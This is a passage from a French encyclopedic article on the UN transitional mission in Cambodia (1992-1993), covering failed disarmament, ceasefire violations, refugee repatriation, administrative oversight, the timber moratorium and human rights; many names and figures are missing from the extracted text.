Malgré tout cela, l’usage de la force pour contraindre la faction khmère rouge à désarmer n’était pas envisagée ; la raison principale était que la mission des forces internationales devait se borner à maintenir la paix et, comme le soulignait le Lieutenant général John Sanderson, échaudé par les interventions militaires occidentales dans l’histoire récente de la région, .
En novembre, si près de éléments des trois factions participantes, ou approximativement un quart des effectifs – soit loin des objectifs de 70 % fixés lors des accords de Paris - avaient rejoint les cantonnements et rendu leurs armes ; il apparaissait que ces chiffres comprenaient une proportion non négligeable de déserteurs qui avaient profité de l’occasion pour régulariser leur situation personnelle. Ainsi, même au sein des troupes internationales on doutait de l’efficacité de ces mesures. On pourra notamment citer le général français Rideau, commandant en second des forces armées qui déclarait au Monde : . Le processus avait en outre dut être suspendu en raison du non-respect des accords par le et de la détérioration de la situation militaire. Environ furent rendues à la vie civile, susceptibles d’être rappelées par l’.
Le , le secrétaire général annonçait au conseil de sécurité que les difficultés à implémenter la seconde phase du cessez-le-feu ont amené à suspendre les cantonnements désarmement et démobilisation. La mission de la composante militaire était recentrée sur la mise en place d’un et .
La riposte de Phnom Penh.
Même s’il pensait comme les deux coprésidents des accords de Paris que le processus de paix devait se poursuivre et que le calendrier prévu devait être respecté, le secrétaire général exprimait ses craintes que les élections se déroulent avec les deux principales forces armées quasiment intactes et celles des deux autres factions encore en partie sur le terrain. Les responsables militaires de Phnom Penh de leur côté se plaignaient que l’ mettait beaucoup de zèle à démobiliser leurs unités mais faisait preuve d’énormément de laxisme quand il s’agissait des escouades khmères rouges.
Avec le début de la saison sèche, les violations du cessez-le-feu se multipliaient, essentiellement dans les provinces de Kampong Thum, Siem Reap et Battambang, au centre et au nord-ouest du pays. Ces violations prenaient typiquement la forme de duels d’artillerie qui chassaient les villageois de leurs foyers sans causer de dommages majeurs des deux côtés. Les troupes de l’État du Cambodge se plaignaient des gains territoriaux enregistrés par le et demandaient à l’envoyé spécial de rétablir l’équilibre militaire "antebellum". Les rapports des observateurs militaires indiquaient que les armées gouvernementales essayaient de récupérer les zones où les partisans de Khieu Samphân avaient étendu leur influence durant la saison humide alors que ces derniers essayaient de consolider leurs gains.
Le représentant spécial appelait, le à une limitation de l’action militaire de toutes les parties, et le secrétaire général, dans son rapport du 15 novembre au conseil de sécurité, appelle à un respect du cessez-le-feu.
À partir de la fin novembre 1992, à la suite de la décision du Conseil de sécurité de prendre des sanctions contre les Khmers rouges, les incidents se multipliaient entre les forces internationales et celles du . Ce sont ainsi six observateurs (trois Britanniques, deux Philippins et un Néo-Zélandais) qui sont faits prisonniers le près de Kampong Thum alors qu’à la même date un hélicoptère doit essuyer un nouveau tir dans lequel un officier français sera blessé d’une balle dans le dos et que dans les jours qui suivent on assiste à une recrudescence de brèves détentions de membres du personnel international.
Le , les hommes de Pol Pot informaient par lettre le représentant spécial que les troupes de l’ ne devaient pas s’introduire dans leur zone sans autorisation préalable et que l’ devrait assumer la responsabilité des conséquences de tout manquement à cette règle. Le représentant spécial et le commandant en chef répondirent le , mettant en avant le caractère tendancieux de la déclaration. Le conseil de sécurité fit également une déclaration où il condamnait fermement la détention illégale de son personnel.
Les violations continuaient et deux nouveaux cas graves eurent lieu à la fin de décembre. La région de Bavel (province de Battambang) essuya des bombardements nourris causant le départ de près de de leurs maisons. Les 24 et 25 décembre, dans la province de Siem Reap, des obus de l’artillerie du explosaient près d’un campement d’un bataillon bangladais ; la zone connut de nouveaux bombardements le .
En janvier et février 1993, les violations du cessez-le-feu continuèrent, notamment des échanges de tirs d’artillerie et de mortier entre les forces de Phnom Penh et celles du . Les troupes gouvernementales lancèrent des attaques dans plusieurs districts, dont la place forte khmère rouge de Pailin, dans la province de Battambang. L’ protesta que cela dépassait largement le cadre de la légitime défense et le représentant spécial demandait aux autorités d’arrêter de violer le cessez-le-feu.
Dans le même temps, le raidissait sa position vis-à-vis des troupes internationales déployées à Pailin, les assujettissant même à résidence.
En janvier, une attaque sur un village de la province de Siem Reap fit huit nouvelles victimes, dont quatre membres de l’ sans que l’on puisse établir si cette attaque était l’œuvre du ou de sympathisants du . Entre janvier et mars ce seront six militaires et civils internationaux qui furent blessés et deux tués dans des actions hostiles contre l’; parmi eux, un soldat bangladais victime d’un mortier soupçonné de venir du .
Alors que la radio des partisans de Pol Pot avait fréquemment attaqué l’ et que ses émissions devenaient de plus en plus hostiles, les autorités de Phnom Penh mirent eux aussi à mal le processus électoral en lançant une campagne médiatique contre les troupes internationales, se présentant comme le seul rempart crédible contre le retour des anciens dirigeants du Kampuchéa démocratique, prétendant qu’il ne fallait pas compter sur l’ pour protéger les Cambodgiens.
Dans le même temps, les membres du et du font l’objet d’attaques et d’intimidations de la part de l’administration aux mains du qui voudrait contrer leur influence croissante auprès de l’électorat.
En avril 1993, alors que la campagne électorale avait débuté, l’ensemble des unités militaires de l’ recevaient l’ordre d’accroitre leur vigilance, d’améliorer les mesures visant à assurer la sécurité du processus électoral et de protéger des conditions d’instabilité les représentants des partis cambodgiens ainsi que le personnel international. Des positions militaires défensives telles que des casemates ou des réduits furent restaurés ou construits, notamment dans les provinces de Siem Reap et Kampong Thum permettant aux soldats de riposter en cas d’attaque.
Les élections et leurs conséquences.
Comme il l’avait annoncé, le ne prit pas part au scrutin et menaçait de le perturber par des actes violents. Toutefois, les incidents furent rares et, le vote s’était déroulé de manière pacifique, avec des électeurs nombreux qui n’avaient pas hésité à braver les menaces contre leur sécurité pour accomplir leur devoir.
Après les élections, les Khmers rouges, grands perdants du scrutin, conservèrent leurs refuges près de la frontière thaïlandaise, où ils n’hésitaient pas à l’occasion à attaquer les troupes internationales qui osaient s’aventurer dans leur domaine.
Ils y bénéficiaient de la complicité de militaires et d’hommes d’affaires de Bangkok qui y trouvaient leur intérêt. Ils mettent en doute la représentativité du gouvernement qui pour eux ne correspond pas au résultat des élections, arguant que l’administration reste aux mains des anciens dirigeants de la République populaire du Kampuchéa et voient dans la coalition une manœuvre du Viêt Nam. Il conserve toutefois le contact avec Norodom Ranariddh, le premier Premier ministre mais refuse tout rapport avec Hun Sen, qui pour eux reste l’agent de Hanoï. Le bureau du à Phnom Penh reste ouvert jusqu’au , quand l'assemblée cambodgienne décrète les Khmers rouges hors-la-loi.
Bilan du désarmement.
Concernant la mission de désarmement, prétendre qu’elle n’a pas été couronnée de succès relève d’un doux euphémisme. À vrai dire, les combats n’avaient jamais cessé et permirent surtout aux positions khmères rouges – la partie qui dans les faits n’appliqua aucun de ses engagements – de sortir renforcées. Au départ des troupes de l’, leur zone d’influence s’était accrue et seuls les grands centres urbains étaient épargnés de leurs escarmouches.
En 1994, un an après le départ des troupes internationales et alors que les troupes de Khieu Samphân étaient estimées à combattants, les dépenses militaires représentaient encore 28 % du budget national et l’on avait assisté à une recrudescence du brigandage.
La paix civile n’interviendra que cinq ans plus tard, alors que des dissensions sont apparues au sein des chefs khmers rouges qui amèneront la plupart d’entre eux à négocier leur reddition en échange d’une amnistie.
Là où la responsabilité de l’ est manifestement engagée est que devant le refus du , les atermoiements des troupes internationales n’ont fait que conforter la partie khmère rouge dans son opposition à coopérer et lui a permis de doubler la zone sous son contrôle dont elle interdisait l’accès aux troupes onusiennes.
Rapatriement des réfugiés.
Avec l’aide du Haut Commissariat des Nations unies pour les réfugiés (HCR), l’ devait organiser le rapatriement et la réinstallation des réfugiés et personnes déplacées par le conflit, tout en respectant les droits humains et leurs libertés fondamentales.
Le avait estimé leur nombre à , dont étaient déjà rentrés spontanément depuis la signature des accords ; 90 % de la totalité d’entre eux avaient moins de 45 ans, la moitié moins de 15, près de 60 % venaient des provinces le long de la frontière entre le Cambodge et la Thaïlande et plus de 66 % vivaient dans des camps depuis plus de dix ans. La gestion du rapatriement était confiée à un directeur nommé par le secrétaire général et qui devait rendre des comptes au représentant spécial et au haut commissaire aux réfugiés. Il fut décidé que ce rapatriement devrait se dérouler dans une période n’excédant pas neuf mois. Il serait d’autre part nécessaire d’identifier des terres agricoles et de peuplement et une assistance à la réinstallation et à l’intégration, ainsi qu’une aide alimentaire la première année.
Le rapatriement a commencé le avec le retour de 526 personnes. Ils ont été accueillis au centre de Sisophon, au nord-ouest par le prince Norodom Sihanouk et Yasushi Akashi. À la fin d’avril, femmes et enfants avaient regagné le Cambodge. Les problèmes ne tardèrent pas à apparaître, principalement à cause de la difficulté à trouver des terres arables déminées, la congestion des centres urbains, la situation sanitaire déplorable dans le pays et les retards dus à la saison des pluies qui empêchèrent beaucoup de rapatriés de participer aux élections. Une plus grande souplesse dans la recherche de solutions de retour apparut rapidement nécessaire et des offres d’établissements sur des zones géographiques plus vastes ou d’activités non agricoles furent étudiées.
Pendant sa visite au Cambodge, du 18 au , Boutros Boutros-Ghali rappela que les rapatriements nécessitaient de pouvoir disposer d’une aide internationale estimée à 116 millions de dollars. Le nombre mensuel de retours, qui était de en avril montait à en juin. À partir de juillet, quelque cambodgiens rentraient tous les mois. Les difficultés de transport de la saison humide obligèrent à utiliser les voies fluviales. Lors de son rapport du au conseil de sécurité, le secrétaire général indiquait qu’à cette date, plus de avaient déjà été rapatriées.
À partir de novembre, les retours étaient de et atteignirent un pic de par mois en janvier et février 1993. En plus des 400 jours de rations (le programme alimentaire mondial avait alloué à cette occasion un fonds spécial de de nourriture) et des kits domestiques, les réfugiés avaient le choix entre plusieurs possibilités d’assistance, allant de la terre agricole à la parcelle habitable en passant par la subvention en liquide à la place des matériaux de construction. La plupart, environ 88 %, choisirent les espèces. Le donnait des informations sur les lieux de destination, en particulier s'ils n’étaient pas facile d’accès ou dangereux. En coopération avec l’, d’autres agences de l’ et plusieurs ONG, le créait un mécanisme destiné à vérifier les conditions des retours à travers tout le pays. Des projets à court terme étaient aussi implémentés pour aider les communautés à résorber l’afflux de rapatriés. Il s’agissait notamment de la réparation des ponts ou des routes, du déminage, du développement agricole, du creusement de puits ou de points d’eau et de la création de centres sanitaires ou scolaires.
On donna aussi à tous ceux qui y avaient droit, la possibilité de s’enregistrer sur les listes électorales de leurs lieux de destination avec la population locale ou dans les six centres de réception. En janvier 1993, comme la date limite approchait, un accord fut trouvé pour permettre à la population qui remplissait les conditions et était encore dans les camps, de se faire temporairement inscrire en Thaïlande et de recevoir leur carte d’électeur lors de leur retour au Cambodge.
Le , Site 2, le dernier des grands camps, fermait ses portes lors d’une cérémonie officielle présidée par le haut commissaire aux réfugiés. Finalement, ce furent réfugiés et personnes déplacées qui avaient été rapatriées sous les auspices de l’. Bien que la majorité vienne de Thaïlande, quelque d’entre eux venaient d’Indonésie, du Viêt Nam et de Malaisie. La plupart d’entre eux choisirent de s’établir dans des zones contrôlées par les autorités de Phnom Penh. Environ s’installaient dans les secteurs du et quelques milliers se prononçaient pour ceux du ou du .
Toutefois, dans les faits, la réinsertion n’eut pas le succès escompté. Outre la lenteur des travaux de réhabilitation, les terrains proposés disposaient la plupart du temps de sols pauvres. D’autre part, ces réfugiés étaient mal accueillis par des populations locales souvent en situation déjà précaire mais qui ne bénéficiaient d’aucune aide. Enfin, les autorités sur place, proches du gouvernement de Phnom Penh, ne voyaient pas toujours favorablement le retour de personnes qui avaient fui leur régime. De plus, des milliers de réfugiés avaient été relogés dans des régions qui du fait du regain de violence obligeaient leurs occupants à fuir ces nouvelles zones de combats. Deux ans et demi après le rapatriement, on estimait que plus du tiers des personnes concernées, vivaient dans des conditions précaires.
En outre, accoutumés à profiter de l’assistance internationale et de l’encadrement sanitaire et médical des camps depuis des années, beaucoup eurent du mal à s’adapter aux aléas du travail en rizière et de ce fait une grande majorité préféra opter pour une compensation financière et alimentaire leur permettant couvrir leurs besoins pour 400 jours et de démarrer une activité artisanale. Cette option a l’avantage de limiter les effets de la pénurie de terrains disponibles, mais rien ne pouvait garantir la viabilité à moyen terme de ces entreprises.
Une étude a posteriori du Programme alimentaire mondial menée deux ans après leur retour montrait qu’environ rapatriés en était réduits à la mendicité et que 25 % des squatters de Phnom Penh victimes des expulsions périodiques sont d’anciens rapatriés. 
On rappellera aussi le témoignage d’une fille de joie du film "Le papier ne peut pas envelopper la braise", née dans un camp, dont la famille avait revendu la terre agricole qui lui avait été allouée pour s’installer dans un bidonville de Phnom Penh puis, une fois le pactole épuisé, avait vendu ses filles dans les circuits de la prostitution. Le cas décrit est malheureusement loin d’être isolé.
Contrôle des activités gouvernementales.
Les accords prévoyaient aussi de contrôler les différentes structures gouvernementales qui pouvaient avoir un impact sur la tenue des élections&lt;ref name="ONU A/C.5/46/SR.64"&gt;&lt;/ref&gt;.
Dès la fin des années 1980, alors que des tractations pour arriver à sortir de la crise cambodgienne avaient débuté, il paraissait clair que les autorités de Phnom Penh ne renonceraient pas facilement à leurs prérogatives. De plus, l’ambigüité des accords de Paris, fruit d’un compromis laborieux pouvait donner lieu à des interprétations différentes, ce dont n’allaient pas se priver les différentes factions, notamment en ce qui concerne le pouvoir de l’, du et des diverses administrations mises en place par les différents partis dans les zones qu’ils contrôlaient. Les Khmers rouges mettaient notamment l’impuissance du sur le compte du maintien de l’administration du gouvernement de Phnom Penh et voulaient dès le début 1992 faire de son démantèlement une condition préalable à la poursuite du processus. Là où certains attendaient un contrôle direct des forces internationales, les Nations unies se contenteront finalement de superviser les structures existantes sans chercher à les démanteler et d’enregistrer les plaintes de tout manquement susceptible de porter atteinte à l’équité du processus électoral.
Mise en place des structures de contrôle.
L’ devait utiliser trois moyens complémentaires de surveillance. Le premier était l’évaluation des documents décrivant le fonctionnement du pouvoir en place, incluant les circuits de prises de décision, la gestion du personnel et celle des problèmes. Le second était de prendre connaissance des résolutions prises par les administrations précédentes et d’avoir toute latitude pour modifier certaines d’entre elles, notamment celles concernant les effectifs, les finances et la vente de biens. Le troisième était de proposer des améliorations dans les processus existants. Ces trois méthodes étaient utilisées de différentes manières, allant de la présence physique de personnel international dans les administrations à des réunions régulières avec les hauts fonctionnaires en passant par la mise en place d’une plus grande transparence dans les prises de décisions. Le Secrétaire Général avait proposé de créer des bureaux sous la supervision de l’ qui gèreraient les domaines des affaires étrangères, de la défense nationale, des finances, de la sécurité publique et de l’information.
D’autres organismes seraient chargés de s’assurer du respect des droits de l'homme au Cambodge, de développer un programme d’éducation et de promotion pendant la période de transition, de recevoir les plaintes concernant « toute action pouvant contrarier le bon fonctionnement de la campagne électorale » et au besoin de mettre en place les actions correctives adéquates. 21 antennes provinciales auraient pour mission de chapeauter les structures administratives existantes, de collecter les informations nécessaires à la réalisation des missions de l’ et concernant les droits de l’homme. Cette administration devait être composée d’environ 224 spécialistes, assistés de 84 experts internationaux. En termes d’implémentation, l’autorité se baserait sur les codes de conduites adoptés et maintiendrait des officiers de liaison dans les diverses zones. Elle pourrait aussi, au besoin avoir à faire respecter des directives.
Les contrôles débutent le dans les cinq domaines définis par les accords de Paris, à savoir les affaires étrangères, la défense nationale, la sécurité publique, les finances et l’information. Au départ, la priorité du déploiement avait été donnée aux régions qui devaient accueillir les réfugiés et les personnes déplacées, mais dès le , les bureaux étaient ouverts dans les 21 provinces, même si les zones contrôlées par le restaient inaccessibles.
Dans le même temps, l’ étendait ses contrôles sur les autres domaines qui pourraient influer sur le déroulement des élections et demandait aux quatre partis cambodgiens de lui remettre l’ensemble de leurs lois pour être examinées. Seule la formation de Khieu Samphân ne se conformait pas à la demande. À partir du mois de mai, le bloquait le processus de paix, notamment au prétexte que les structures administratives dans les zones sous le contrôle des forces de Phnom Penh restaient aux mains de ces dernières et proposait de les remplacer par des commissions gérée par le . À la demande du Conseil de sécurité, la proposition est étudiée par la Thaïlande et le Japon mais rejetée car non conforme aux accords de Paris.
Au même moment, les efforts s’accélèrent en matière de recrutement et de déploiement du personnel civil destiné à surveiller l’administration existante et un accord a été trouvé avec les partisans de Pol Pot permettant d’informer et faire participer les quatre parties cambodgiennes aux efforts de vérification. Le , le représentant spécial présente un plan de contrôle qui prévoyait de faire passer sous tutelle les affaires étrangères et la défense nationale dès le 1 juillet, les finances progressivement entre juillet et septembre et la sécurité publique le . Enfin un groupe de communication auquel participeraient les quatre parties cambodgiennes entrerait en fonction le . À la fin juillet 1992, environ observateurs avaient été déployés à travers le pays pour contrôler le renforcement impartial et équitable de la loi et de l’ordre.
Toutefois, il apparait assez vite que l’activité des instances internationales est régulièrement entravée par l’omnipotence des structures de l’ancien gouvernement de la République populaire du Kampuchéa. Une mission sénatoriale française reporte par exemple que son emprise sur les autorités locales est suffisante pour permettre de déjouer les demandes de l’ concernant le renvoi de personnalités proches du pouvoir central et qui sont accusées d’être un frein à la recherche d’une certaine neutralité. De plus, comme une partie importante de ce personnel était déployée dans les ministères, ils apparaissent rapidement plutôt comme une expression déguisée d’aide et d’assistanat. Ce qui amena par exemple le à accuser l’ de collaborer exclusivement avec le gouvernement de Phnom Penh au lieu du .
Affaires étrangères.
Concernant le domaine des affaires étrangères, l’ devait vérifier la distribution de l’aide étrangère ainsi que l’émission des passeports et des visas. Elle devait aussi surveiller les différentes activités frontalières, comme l’immigration, les douanes et la mise en œuvre des moratoires du sur le bois, les minéraux et les pierres précieuses. Une unité de contrôle des frontières fut créée, chargée d’établir la liaison entre l’ et les structures administratives existantes. Des observateurs avaient aussi été postés aux points de contrôle et participaient aux patrouilles le long de la frontière.
Le , le mis en place un comité consultatif chargé de revoir les arrangements passés concernant l’exploitation des ressources naturelles, notamment forestières et minières. Le , le comité faisait adopter un moratoire sur l’exportation de bois cambodgien afin de protéger les ressources naturelles du pays et demandait à l’ de prendre les mesures pour faire respecter cette suspension. Par la résolution 792 du , le conseil de sécurité approuvait cette décision et demandait aussi au d’étudier la possibilité d’étendre le moratoire aux minerais et aux pierres précieuses.
Peu après –simple coïncidence ou réaction de mauvaise humeur ? – la Thaïlande annonçait que .
Un appel de l’ aux pays riverains débouche sur des déclarations du Laos, du Viêt Nam et même de la Thaïlande, annonçant qu’ils établiraient un embargo sur les importations de bois cambodgien à partir du . Les Nations unies déployèrent des gardes frontières pour contrôler la situation aussi bien sur terre que sur mer. Toutefois, les violations continuèrent à grande échelle, impliquant le personnel de l’ensemble des partis cambodgiens, même si le refus du de laisser les troupes internationales accéder aux territoires qu’il contrôlait empêchait d’avoir une idée précise de l’ampleur du trafic. À la réunion du du , il est proposé d’étendre le blocus des exportations de bois aux minerais et aux pierres précieuses. À l’initiative du FUNCINPEC il était demandé d’élargir le moratoire à l’extraction de minerai. La proposition fut acceptée par trois des quatre partis.
Le sujet fut à nouveau abordé lors de la réunion du 10 février où l’idée fut adoptée malgré les objections du . Lors de la même réunion, des mesures supplémentaires destinées à restreindre l’abattage des arbres furent adoptées, qui réduisait les quotas d’’exportation de coupes de bois. En février 1993, le approuvait l’ébauche de plan d’action proposé par l’ au sujet d’une déclaration sur l’extraction et l’exportation de minerais et de pierres précieuses du Cambodge. Cette déclaration devint effective le et étendait le moratoire à l’exploitation commerciale des ressources minérales sur terre et en mer. De plus, il était demandé d’empêcher la livraison de produits pétroliers dans les zones contrôlées par des factions qui ne se conformeraient pas aux accords de Paris.
Après les élections, si la tâche de l’ se limite à assurer une transition en douceur des structures administratives vers le nouveau gouvernement, la surveillance de l’application du moratoire du sur le bois, les minerais et les pierres précieuses ainsi que le contrôle des flux migratoires et des frontières restait du domaine des organisations internationales.
Information de la population.
Après deux décennies de combats et d’isolement, beaucoup de Cambodgiens étaient sceptiques sur la possibilité de la communauté internationale à appliquer dans leur pays les concepts de base des droits de l’homme et notamment l’organisation d’élections libres et équitables, sachant que le Cambodge n’avait jamais de toute son histoire connu de réelles expériences multipartis.
La division à l’information et à l’éducation de l’ avait la responsabilité de produire des supports en langue khmère et de les faire distribuer à l’ensemble de la population. Elle devait également publier des indications visant à encadrer les restrictions légales, à encourager l’exercice d’une presse libre et équitable et enfin à encourager la création d’une association de journalistes cambodgiens. Elle poursuivait aussi ses efforts pour contrôler les structures administratives qui traitent de l’information. Le représentant spécial émettait une directive sur l’utilisation équitable des médias pendant la campagne électorale et l’ avait créé ses propres chaines de télévision et de radio ainsi que d’autres supports accessibles aux 20 partis politiques inscrits.
Le , la station radio débutait ses programmes à Phnom Penh depuis un émetteur du gouvernement mis à la disposition exclusive de l’. À partir d’avril 1993, les stations relais permettaient de couvrir l’ensemble du pays et dès le début mai, les émissions passaient à 15 heures par jour. De plus, après accords du ministère thaïlandais des affaires étrangères et de Voice of America, les programmes étaient retransmis deux fois par jour sur l’émetteur thaïlandais de la station américaine. Les émissions se concentraient sur le processus électoral, les droits de l’homme et d’autres aspects du mandat international. Pendant la campagne, une importance particulière était accordée au secret des bulletins. En accord avec la directive du représentant spécial, la radio allouait un segment hebdomadaire à chaque parti et permettait un droit de réponse à tout candidat, parti politique ou officiel en cas d’attaque abusive.
L’ fournissait aussi au public un choix de vidéos, affiches, dépliants, banderoles, panneaux et publicités pour faire valoir son travail et informer les Cambodgiens du déroulement du processus électoral et les encourager à y participer. Ces activités comprenaient la propagation d’information sur les différents partis en lice, assurer que les bulletins resteraient secrets et renseigner sur les procédures de la campagne. Des vidéos comprenant des discussions impliquant des représentants des vingt partis engagés étaient distribuées à Phnom Penh et dans tout le pays. Des traductions et analyses des émissions radios et documents imprimés par les quatre factions signataires des accords de Paris étaient fournies au représentant spécial. Des agents devaient faire régulièrement des enquêtes d’opinion auprès des Cambodgiens pour mesurer l’impact du programme d’information et pour suivre le ressenti de la population envers l’ et le processus de paix.
Droits de l’homme.
La mise en place d’un environnement propice à des élections libres incluait aussi le respect des droits de l’homme, ce qui n’allait pas sans comporter une certaine hypocrisie quand on se rappelle que les massacres commis par les Khmers rouges n’avaient pu être nommément désigné autrement que par des formules ampoulées telles les ou la . D’autre part, la présence dans les rangs des troupes onusiennes de ressortissants de pays régulièrement mis en cause par de nombreuses permettait de douter de leur efficacité à faire respecter des droits qui étaient violés chez eux.
Toutefois, dans son rapport du , le secrétaire général précise que , et que pendant la phase transitoire, les forces internationales doivent se limiter à .
La situation ne se présentait pas sous les meilleurs auspices si on se rappelle que parmi les deux principaux groupes qui s’affrontent, le refuse l’accès aux zones qu’il contrôle et des manquements importants ont aussi été observés du côté des autorités de Phnom Penh.
Un programme de formation aux problèmes de droits de l’homme destiné aux professeurs avait été mis au point et prévoyait également d’éduquer les personnels de santé et de la fonction publique. En outre, l’avenir devait être préparé en incitant le à ratifier les lois et décrets internationaux garantissant les libertés fondamentales. Le sujet avait aussi été incorporé dans les programmes scolaires et faisait l’objet d’une matière aux facultés de droit et de médecine de Phnom Penh. Les organisations locales de défense des droits humains devaient aussi être aidées et recevoir des formations, du matériel pédagogique et des subventions pour développer leurs activités. De son côté, le adoptait une série de lois consacrant la liberté d’association et les fondements d’un système pénal destiné à être appliqué à l’ensemble du Cambodge.
L’ surveillait les conditions de détention dans les prisons cambodgiennes et pressait les autorités locales d’améliorer la situation dans la mesure des possibilités de l’administration pénitentiaire. L’autorité enquêtait également sur les cas de prisonniers dont la détention pouvait avoir des motivations politiques. En outre, si le maintien de l’ordre et le respect des lois restaient échus aux diverses composantes cambodgiennes, cela devait se faire sous la houlette de l’. Le secrétaire général avait estimé que cette supervision nécessitait contrôleurs pour vérifier les activités des policiers cambodgiens recensés. Là aussi, l’accord prévoyait des unités d’observation à Phnom Penh, dans les 21 provinces, mais également dans les 200 districts du pays.
À la suite de premiers rapports faisant état d’incidents violents contre des figures politiques, un communiqué fut diffusé le , insistant sur la détermination des Nations unies à encourager un environnement où le respect des droits de l’homme et des libertés fondamentales seraient assurés. Le à Phnom Penh, le secrétaire général des Nations unies participait à une réunion avec le dans laquelle les membres signaient une convention internationale sur les droits politique et civil et une autre sur les droits économique, social et culturel.
À la fin juillet 1992, une centaine de cas de violations de droits humains étaient en cours d’instruction dans les zones contrôlées par le pouvoir de Phnom Penh alors que les enquêtes dans les zones des autres parties devaient débuter rapidement.
Dans le même temps, le , le ratifiait les conventions contre la torture et autres peines ou traitements cruels, inhumains ou dégradants, pour l’élimination de toutes les formes de discrimination contre les femmes, relatives aux droits de l’enfant et celle concernant le statut des réfugiés. Un bureau des droits de l’homme devait être créé avec un personnel qui incluait des défenseurs, des éducateurs et des enquêteurs. Autre signe encourageant : au début de 1993, on notait la création de cinq associations de défense des droits de l’homme, qui rassemblaient en tout près de .
Du 30 novembre au , un symposium international avait lieu à Phnom Penh, avec au menu des cours de défense des droits de l’homme, les procédures des Nations unies sur le sujet et les risques liés aux élections. De plus, afin de promouvoir un système judiciaire indépendant, un programme important de formation était lancé, destiné aux juges et aux avocats. Des cours pour les agents de l’administration en place et les activistes des groupes de défense eurent lieu dans la plupart des provinces. Les participants comprenaient des représentants de partis politiques, d’associations des droits humains, de futurs professeurs, des employés de la justice et de la police.
Toutefois, ces bonnes intentions n’étaient pas confirmées dans les faits, et, à partir de novembre 1992, on assista à une recrudescence d’incidents violents contre des bureaux de partis politiques ou de leur personnel. Ces attaques visaient en priorité le FUNCINPEC et le PLDB, et les enquêtes menées par l’ montrèrent que dans la plupart des cas elles étaient le fait de membres de l’administration locale proche du pouvoir de Phnom Penh ou de leurs partisans. En plus des enquêtes sur ces incidents, des mesures en vue de se prémunir et de lutter contre les menaces à l’ordre public étaient développées. Les instances onusiennes annonçaient qu’elles feraient du combat contre les intimidations et les atteintes à la liberté de réunion leur priorité.
Le , citant les attaques continues contre les membres du , le prince Sihanouk informait le représentant spécial qu’il ne pouvait plus coopérer avec l’ et le gouvernement du Cambodge. Norodom Ranariddh, dirigeant du , déclarait lui aussi qu’il cessait ses relations de travail avec les troupes internationales jusqu’à ce que des moyens soient effectivement mis en œuvre pour mettre fin au climat de violence.
Le , le représentant spécial publiait une directive établissant des procédures pour poursuivre les personnes responsables de violations des droits de l'homme. Ces instructions donnaient à l’ le pouvoir d’arrêter, détenir et poursuivre les suspects de manquements graves. De même, le bureau d’un procureur spécial était créé. La police internationale de son côté menait des centaines d’enquêtes sur des crimes graves. Dans beaucoup de ces affaires, le procureur avait suffisamment de preuves pour émettre des mandats. Quand les motivations politiques ou ethniques étaient prouvées, le cas était soulevé auprès du ou lors de réunions privées avec les dirigeants des partis. Le représentant spécial rencontra les deux dirigeants pour les informer des mesures prises pour promouvoir un environnement politique neutre. Le prince Ranariddh exprima sa satisfaction et rappela que son parti avait toujours coopéré et allait continuer à le faire. Sihanouk, de son côté s’était également ravisé et profita d’une réunion du , le à Pékin pour exprimer publiquement son soutien à l’ et au respect des accords de Paris. Lors de cette réunion, le prince publia en son nom et en celui des membres du conseil appartenant au , au et au , un communiqué condamnant la violence contre les Cambodgiens et les personnes étrangères, ainsi que tout acte qui menacerait la dignité, les libertés fondamentales, les droits et la sécurité de tout membre des forces internationales.
Le , la Commission des droits de l'homme des Nations unies adoptait une résolution évoquant pour la première fois la présence d’un bureau à Phnom Penh qui fonctionnerait après le départ de l’. Une des principales tâches de cette commission fut alors de préparer la mise en place de cette présence qui devait être un facteur important de la vie politique cambodgienne.
Les actes de violences et d’intimidation qui avaient connu un paroxysme en décembre, s’apaisèrent en janvier mais reprirent de plus belle au début de février, notamment dans les provinces de Battambang et de Kampong Cham ; dans la très grande majorité des cas, les victimes étaient des membres du . Néanmoins, les 7 et 8 avril lors de sa seconde visite au Cambodge, le secrétaire général déclara au que les conditions minimales et acceptables pour la tenue de la campagne électorale semblaient réunies. Il se basait notamment sur le fait qu’elle était menée de manière pacifique par des dizaines de milliers de Cambodgiens.
Toutefois, malgré ces signes encourageant, la violence et l’intimidation demeuraient des freins à la mise en place d’un environnement politique neutre. Les victimes comprenaient des membres des quatre factions cambodgiennes. Ainsi, pour la période courant du 1 mars à la mi-mai 1993, les instances internationales avaient recensé 27 exactions contre des représentants politiques, 25 faits d’intimidations contre des civils attribués au , 7 attaques à caractères raciales, 19 manœuvres d’intimidation politique et 32 opérations contre le personnel de l’. Ces incidents avaient provoqué quelque 200 décès, 338 blessés et 114 personnes enlevées. Les enquêtes ont attribué 131 morts, 50 blessés et 53 enlèvements aux sympathisants khmers rouges et au moins 15 décès et 9 blessés au gouvernement de Phnom Penh.
Après les élections, le rôle de l’ se limitait à assurer une transition en douceur des structures administratives vers le nouveau gouvernement et à transférer la supervision des questions relatives aux droits de l’homme à la commission de l’ONU qui, conformément aux accords de Paris, ouvrirait un bureau à Phnom Penh. Au niveau provincial, cela comprenait les enquêtes pour toute accusation de violation des droits de l’homme ou d’intimidation politique et cela devait faciliter le travail des agences qui se mettaient en place. Sur le plan national, les efforts se concentraient sur l’aspect judiciaire et l’administration de la justice. Au départ des troupes internationales, les bases restaient fragiles et les bonnes résolutions tardaient à être suivies d’effet. Toutefois, les avancées étaient loin d’être négligeables, et ce malgré les réticences de la classe dirigeante. Plus de 30 journaux avaient vu le jour alors que des débats sur la nouvelle constitution, organisés par des cambodgiennes avaient lieu dans l’ensemble des zones qui n’étaient pas contrôlées par le .
Mais ces progrès ne doivent pas faire oublier les nombreux manquements qui ont continué à avoir lieu et qui sont reprochés encore de nos jours par plusieurs organisations. On citera notamment Human Rights Watch qui dans son rapport de 1993 notait : .
Défense.
Dans le domaine de la défense nationale, l’ devait inspecter les structures militaires des trois partis et établir des modalités telles que le contrôle des correspondances afin de s’assurer qu’aucune action ne pouvait mettre à mal la neutralité de l’environnement politique. Les responsables des forces armées des trois factions qui se conformaient aux accords de Paris signèrent une directive destinée à réguler l’activité politique du personnel militaire. À la demande des autorités internationales, le ministre de la défense du gouvernement de Phnom Penh établissait un comité chargé d’enquêter sur les accusations d’activités illégales de la part des forces armées.
Le comité allait toutefois rapidement montrer ses limites et de nombreuses voix reporteront les tentatives d’intimidation des composantes militaires des diverses factions, surtout dans les zones reculées où la présence de l’ est la moins visible.
Sécurité publique.
